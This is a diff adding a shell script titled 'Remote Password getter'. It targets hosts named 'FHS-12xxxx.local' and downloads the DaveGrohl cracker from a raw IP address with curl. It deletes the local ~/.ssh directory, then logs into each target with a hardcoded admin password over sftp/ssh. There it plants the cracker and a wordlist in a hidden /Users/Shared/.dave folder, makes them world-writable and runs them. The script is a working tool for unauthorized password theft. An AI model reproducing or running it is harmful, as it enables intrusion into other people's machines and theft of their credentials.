@@ -1,0 +1,57 @@
+#!/bin/sh
+
+# Remote Password getter
+# Automates password cracking using DAVE GROHL http://davegrohl.org/
+
+success=false; wdir="`dirname \"$0\"`"; cd $wdir
+until [[ $success = true ]]; do
+	echo Input last four digits
+	read fourdigi
+	computername=$(echo "FHS-12"$fourdigi".local")
+	echo $computername
+		if [ $(ping -c 1 $computername >/dev/null 2>&1 && echo true || echo false) = "true" ]; then echo The host is reachable; computerip=$(ping -c 1 $computername | grep "64 bytes from"|awk '{print $4}'); computerip=$(echo $computerip | sed 's/[:]*//g'); success=true; else echo The host is unreachable; fi
+done
+echo "[$(date "+%m-%d %H:%M:%S")] Connected to $computerip" >> ~/Library/Logs/pGet.log
+if [[ ! -d $wdir/dave ]]; then
+	echo Downloading Dave
+	curl -O http://4.30.110.241:303/dave.zip
+	unzip $wdir/dave.zip
+	rm -rf $wdir/dave.zip $wdir/__MACOSX
+fi
+rm -rf ~/.ssh
+if [[ ! -f $wdir/pGet.ex ]]; then
+	echo '#!/usr/bin/expect -f
+	set timeout 9999999999999
+	set password 'm@xc0m1'
+	set ipaddr '$computerip'
+	set whoami 'admin'
+	spawn sftp $whoami@$ipaddr
+	expect "The authenticity of host*"
+	send -- "yes\r"
+	expect "*?assword:*"
+	send -- "$password\r"
+	expect "sftp> "
+	send -- "mkdir /Users/Shared/.dave\r"
+	expect "sftp> "
+	send -- "mkdir /Users/Shared/.dave/wordlists\r"
+	expect "sftp> "
+	send -- "put '$wdir'/dave/dave /Users/Shared/.dave/dave\r"
+	expect "/Users/*"
+	send -- "put '$wdir'/dave/davehelp.sh /Users/Shared/.dave/davehelp.sh\r"
+	expect "/Users/*"
+	send -- "put '$wdir'/dave/wordlists/codes.txt /Users/Shared/.dave/wordlists/codes.txt\r"
+	expect "/Users/*"
+	send -- "chmod +777 /Users/Shared/.dave/dave\r"
+	expect "sftp> "
+	send -- "chmod +777 /Users/Shared/.dave/davehelp.sh\r"
+	expect "sftp> "
+	send -- "exit\r"
+	spawn ssh $whoami@$ipaddr /Users/Shared/.dave/davehelp.sh
+	expect "*?assword:*"
+	send -- "$password\r"
+	expect "fhs-*"' >> $wdir/pGet.ex; chmod +x $wdir/pGet.ex
+fi
+cd $wdir
+./pGet.ex
+rm $wdir/pGet.ex
+echo $done
